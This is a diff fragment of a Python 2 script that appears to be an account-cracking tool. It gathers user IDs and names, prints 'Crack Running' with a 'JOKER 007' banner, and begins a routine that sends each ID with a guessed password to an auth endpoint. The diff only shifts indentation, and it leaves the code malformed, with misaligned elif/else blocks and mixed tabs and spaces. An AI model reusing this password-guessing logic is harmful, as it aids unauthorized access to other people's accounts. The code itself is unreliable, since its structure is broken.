@@ -695,7 +695,7 @@ def a_s():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-            elif a_s == '3':
+     elif a_s == '3':
 
         os.system('clear')
 
@@ -723,39 +723,39 @@ def a_s():
 	    raw_input('Press Enter To Back. ')
 	    crack()
 
-        elif a_s == '0':
+     elif a_s == '0':
 
         menu()
 
-    else:
+     else:
 
-        print ''
+          print ''
 
-        print '\tChoose valid option' + w
+          print '\tChoose valid option' + w
 
-        a_s()
+          a_s()
 
-    print ' Total ids: ' + str(len(id))
+     print ' Total ids: ' + str(len(id))
 
-    time.sleep(0.5)
+     time.sleep(0.5)
 
-    print ' \033[1;92mCrack Running\033[1;94m '
+     print ' \033[1;92mCrack Running\033[1;94m '
 
-    time.sleep(0.5)
+     time.sleep(0.5)
 
-    print 47 * '-'
+     print 47 * '-'
 
-    print '\t\033[1;92m   THE JOKER 007 UNITY BRAND\033[1;94m'
+     print '\t\033[1;92m   THE JOKER 007 UNITY BRAND\033[1;94m'
 
-    print 47 * '-'
+     print 47 * '-'
 
     
 
-    def main(arg):
+     def main(arg):
 
-        user = arg
+         user = arg
 
-        (uid, name) = user.split('|')
+         (uid, name) = user.split('|')
 
          try:
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
